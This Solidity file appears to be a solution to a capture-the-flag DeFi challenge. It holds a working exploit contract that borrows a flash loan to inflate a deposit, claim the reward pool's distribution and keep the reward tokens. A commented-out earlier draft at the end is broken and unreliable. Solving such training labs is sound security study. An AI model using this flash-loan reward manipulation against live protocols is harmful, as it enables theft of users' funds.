// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

interface IRewardToken {
    function balanceOf(address user) external returns (uint256);

    function transfer(address user, uint256 amount) external;
}

contract HackReward {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    IRewardToken public reward;

    constructor(
        address _pool,
        address _token,
        address _rewardPool,
        address _reward
    ) public {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = IRewardToken(_reward);
    }

    function receiveFlashLoan(uint256 amount) public {
        token.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.distributeRewards();
        rewardPool.withdraw(amount);
        token.transfer(address(pool), amount);
    }

    // fallback() external {
    //     uint bal = token.balanceOf(address(this));

    //     token.approve(address(rewardPool), bal);
    //     rewardPool.deposit(bal);
    //     rewardPool.withdraw(bal);

    //     token.transfer(address(pool), bal);
    // }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}
// contract RewarderHacker {
//     TheRewarderPool pool;
//     FlashLoanerPool flashloan;
//     DamnValuableToken token;
//     IRewardToken rewardtoken;

//     constructor(
//         address _pool,
//         address _flashloan,
//         address _token,
//         address _rewardtoken
//     ) {
//         pool = TheRewarderPool(_pool);
//         flashloan = FlashLoanerPool(_flashloan);
//         token = DamnValuableToken(_token);
//         rewardtoken = IRewardToken(_rewardtoken);
//     }

// function attack() external {
//         pool.flashLoan(token.balanceOf(address(pool)));
//         reward.transfer(msg.sender, reward.balanceOf(address(this)));
//     }

//     function receiveFlashloan(uint256 amount) public {
//         token.approve(address(pool), amount);
//         pool.deposit(amount);
//         pool.withdraw(amount);
//         token.transfer(address(flashloan), amount);
//     }
// }
